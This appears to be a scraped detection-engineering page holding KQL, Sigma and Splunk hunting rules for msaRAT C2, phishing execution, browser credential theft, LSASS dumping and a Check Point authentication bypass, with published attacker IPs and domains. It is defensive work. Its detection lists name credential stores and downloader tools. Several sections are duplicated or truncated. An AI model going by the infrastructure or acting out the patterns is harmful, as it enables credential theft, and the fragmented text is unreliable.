1) Triage: inspect the parent process and the --user-data-dir path — a parent that is not a known automation runtime (node/python/CI agent) launching headless with a debug port is highly suspicious; capture the full command line. 2) Contain: isolate the host and kill the browser + parent process tree; block outbound to is-01-ast.ols-img-12.workers.dev and the C2 IPs. 3) Hunt: correlate with a preceding msiexec/update_ms.msi execution and outbound WebRTC/STUN/TURN traffic (global.turn.twilio.com, stun2.l.google.com) from the same browser PID.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("chrome.exe","msedge.exe")
| where ProcessCommandLine has "--headless"
| where ProcessCommandLine has_any ("--remote-debugging-port","--remote-debugging-pipe")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","explorer.exe","node.exe","python.exe","pwsh.exe","powershell.exe","code.exe","electron.exe","cypress.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\chrome.exe" or NewProcessName endswith "\\msedge.exe"
| where CommandLine has "--headless"
| where CommandLine has_any ("--remote-debugging-port","--remote-debugging-pipe")
| where not(ParentProcessName has_any ("chrome.exe","msedge.exe","explorer.exe","node.exe","python.exe","powershell.exe","pwsh.exe","Code.exe","electron.exe"))
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: Headless Browser Launched with Remote Debugging (msaRAT CDP C2)

msaRAT C2 signaling: traffic to Cloudflare Workers endpoint / staging IPs AICommand & Control Medium
Alerts on network activity to msaRAT's hard-coded WebRTC signaling relay (is-01-ast.ols-img-12.workers.dev) and the campaign's staging/C2 IPs (172.86.126.18, 45.61.134.36) and domain thesecure.biz. These are confirmed Talos IOCs; the workers.dev subdomain is specific enough to avoid blanket-CDN false positives. Rationale: is-01-ast.ols-img-12.workers.dev, 172.86.126.18, 45.61.134.36 and thesecure.biz are the Talos-published msaRAT IOCs; the full workers.dev subdomain (not a wildcard) plus the dedicated IPs make these high-fidelity network indicators. Cross-checked against: • https://malware.news/t/chaos-ransomwares-msarat-living-off-the-browser-to-build-a-covert-c2-channel/124199 • https://blog.talosintelligence.com/new-chaos-ransomware/
ATT&CKT1071.001 T1102 T1090.004
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel enrichment / sandbox detonation hosts deliberately resolving the IOCs
  • Security researchers or IR tooling connecting to the C2 for analysis
  • Proxy/URL-rewrite products re-fetching the domain for categorization
  • Passive DNS or scanner infrastructure touching the workers.dev subdomain
Suppression filter
| where InitiatingProcessFileName !in~ ("cuckoo.exe","analyzer.exe") and DeviceName !startswith "SANDBOX"
Response runbook
1) Triage: identify the initiating process — if chrome.exe/msedge.exe is reaching is-01-ast.ols-img-12.workers.dev it corroborates the msaRAT CDP C2; confirm the host isn't a sandbox/researcher box. 2) Contain: block the domain and IPs at proxy/firewall, isolate the endpoint, and preserve volatile memory. 3) Hunt: pivot on the host for update_ms.msi execution, headless-browser-with-debug-port launches, and WebRTC TURN traffic to global.turn.twilio.com; sweep the org for any other host resolving the same IOCs.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "is-01-ast.ols-img-12.workers.dev"
    or RemoteUrl has "thesecure.biz"
    or RemoteIP in ("172.86.126.18","45.61.134.36")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessAccountName
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationIP in ("172.86.126.18","45.61.134.36")
    or DestinationHostName has_any ("is-01-ast.ols-img-12.workers.dev","thesecure.biz")
    or RequestURL has_any ("is-01-ast.ols-img-12.workers.dev","thesecure.biz")
| project TimeGenerated, SourceHostName, SourceIP, DestinationIP, DestinationHostName, RequestURL, DestinationPort, ApplicationProtocol, DeviceProduct
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

     | `drop_dm_object_name(All_Email)`

| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",

         by Processes.dest, Processes.user

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Check Point has released security updates to address multiple vulnerabilities impacting Security Management and Multi-Domain Management (MDSM) products, including a critical flaw that has come under active exploitation in the wild. The security flaw, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass affecting the Check Point SmartConsole login process that allows an

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Inbound to Check Point Management Server from CVE-2026-16232 attacker IPs · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] SmartConsole login via 'application token' auth method — CVE-2026-16232 exploitation · Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Inbound to Check Point Management Server from CVE-2026-16232 attacker IPs AIDelivery Medium
Hunts network traffic to/from the six IPs Check Point published as IoCs for the actively-exploited SmartConsole auth-bypass (CVE-2026-16232). Any communication with these IPs against an internet-exposed Security Management / MDSM host is a strong compromise signal. Rationale: Uses the six exact attacker IPs Check Point published for CVE-2026-16232; hard network IoCs corroborated by the vendor advisory sk185169 and CISA KEV, so any hit is high-fidelity. Cross-checked against: • https://support.checkpoint.com/results/sk/sk185169/ • https://vulnerability.circl.lu/vuln/CVE-2026-16232
ATT&CKT1190
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel enrichment/scanning appliance in the org legitimately probing the same IPs
  • Security researcher or IR team validating IoCs from a corporate host
  • Shared-hosting IP later reassigned to a benign service
  • Honeypot/deception host intentionally interacting with the IPs
Suppression filter
| where not(DeviceProduct has_any ("IPS","ThreatIntel") and DeviceAction == "Detect")
Response runbook
1) Triage: confirm the local host is the internet-exposed Security Management / MDSM server and whether Trusted Clients IP restriction is configured; pull the full CEF session around the hit. 2) Contain: block the six attacker IPs at the perimeter, restrict Management access to trusted subnets, and force-rotate SmartConsole admin credentials and API keys. 3) Hunt: pivot to any SmartConsole admin logins, run-script/exec-command operations, and security-policy or Trusted-Clients config changes from these IPs or during the same window.

SmartConsole login via 'application token' auth method — CVE-2026-16232 exploitation AIExploitation Medium
Detects SmartConsole administrative logins to Check Point Security Management/MDSM sourced from the CVE-2026-16232 attacker IPs, where the auth bypass mints an application login token to gain full admin without valid credentials. Targets the credential-access step of the confirmed in-the-wild campaign. Rationale: Anchors a SmartConsole admin-login event on the Check Point management product plus the exact CVE-2026-16232 attacker IPs; the vendor advisory confirms token-based auth bypass, so an admin login from these IPs is near-certain exploitation. Rebuilt on canonical CommonSecurityLog columns (no AdditionalExtensions). Cross-checked against: • https://support.checkpoint.com/results/sk/sk185169/ • https://vulnerability.circl.lu/vuln/CVE-2026-16232
ATT&CKT1212 T1528
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • An administrator legitimately connecting from a home/VPN IP that coincidentally overlaps a reassigned attacker IP range
  • Managed-service provider admin session logged with an unexpected source IP
  • SmartConsole automation/API service account authenticating from a proxy egress IP
  • Log source mislabeling a health-check probe as a login event
Response runbook
1) Triage: verify the target is an internet-exposed Management Server and check whether the source IP is on the Trusted Clients allow-list; identify which admin account/token was issued. 2) Contain: revoke all active SmartConsole sessions and application tokens, reset admin credentials, and apply the July 22 Jumbo hotfix if not already installed. 3) Hunt: review all policy installs, run-script/exec-command executions, and object/rulebase edits performed by that session and correlate with the other five attacker IPs.

| where DeviceProduct has_any ("SmartConsole","Security Management","Management Server","MDSM","MDM")
| where Activity has_any ("Login","Log In","Authentication") or Message has_any ("login","application token","authenticate")
| where SourceIP in ("151.241.99.207","151.241.99.233","158.62.198.182","192.142.10.99","139.28.37.250","194.213.18.137")
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, DestinationHostName, SourceUserName, Activity, DeviceAction, Message
| order by TimeGenerated desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

DeviceTvmSoftwareVulnerabilities

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
